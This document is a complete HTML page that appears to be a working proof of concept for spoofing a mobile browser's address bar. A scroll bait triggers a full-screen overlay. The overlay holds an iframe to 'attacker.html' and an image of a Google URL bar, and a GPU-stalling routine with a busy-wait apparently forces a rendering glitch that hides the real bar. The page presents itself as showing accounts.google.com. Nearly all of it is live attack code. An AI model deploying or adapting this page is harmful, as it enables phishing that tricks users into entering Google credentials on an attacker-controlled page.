<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
    />
    <title>azzzab</title>
    <style>
      body,
      html {
        margin: 0;
        padding: 0;
        width: 100%;
        height: 200vh;
        background-color: #f8f9fa;
        font-family: -apple-system, Roboto, sans-serif;
        scroll-behavior: smooth;
        overflow-x: hidden;
      }

      #scroll-bait {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100vh;
        text-align: center;
        color: #5f6368;
        padding: 20px;
        box-sizing: border-box;
      }

      .bounce-arrow {
        font-size: 50px;
        margin-top: 30px;
        animation: bounce 2s infinite;
      }

      @keyframes bounce {
        0%,
        20%,
        50%,
        80%,
        100% {
          transform: translateY(0);
        }
        40% {
          transform: translateY(20px);
        }
        60% {
          transform: translateY(10px);
        }
      }

      #fake-ui {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
        z-index: 99999;
        background: #fff;
      }

      #fake-bar {
        position: absolute;
        bottom: 0;
        left: 0;
        width: 100%;
        object-fit: contain;
        display: block;
        border-top: 1px solid #ddd;
      }

      #fake-content {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: calc(100vh - 60px);
        border: none;
        display: block;
      }

      #gpu-killer {
        position: fixed;
        top: 0;
        left: 0;
        width: 1px;
        height: 1px;
        pointer-events: none;
        z-index: 1;
      }
    </style>
  </head>
  <body>
    <div id="scroll-bait">
      <svg width="48" height="48" viewBox="0 0 24 24" fill="#1a73e8">
        <path
          d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15h-2v-2h2v2zm0-4h-2V7h2v6z"
        />
      </svg>
      <h2>Scroll down to see the contents of accounts.google.com</h2>
    </div>

    <div id="gpu-killer"></div>

    <div id="fake-ui">
      <iframe id="fake-content" src="attacker.html"></iframe>

      <img id="fake-bar" src="urlbar-google.jpg" alt="Google Address Bar" />
    </div>

    <script>
      let isSpoofed = false;

      function triggerMeltdown() {
        const killerContainer = document.getElementById("gpu-killer");

        for (let i = 0; i < 2000; i++) {
          let div = document.createElement("div");
          div.style.position = "absolute";
          div.style.width = "200vw";
          div.style.height = "10vh";
          div.style.background = "rgba(0,0,0,0.01)";
          div.style.backdropFilter = "blur(10px) contrast(200%)";
          div.style.transform = `rotate(${Math.random() * 360}deg)`;
          killerContainer.appendChild(div);
        }

        let start = Date.now();
        while (Date.now() - start < 400) {}
      }

      window.addEventListener(
        "scroll",
        () => {
          if (window.scrollY > 80 && !isSpoofed) {
            isSpoofed = true;

            let fakeUI = document.getElementById("fake-ui");
            fakeUI.style.display = "block";
            triggerMeltdown();

            window.scrollTo(0, 0);

            setTimeout(() => {
              document.getElementById("gpu-killer").innerHTML = "";
            }, 1000);
          }
        },
        { passive: true },
      );
    </script>
  </body>
</html>
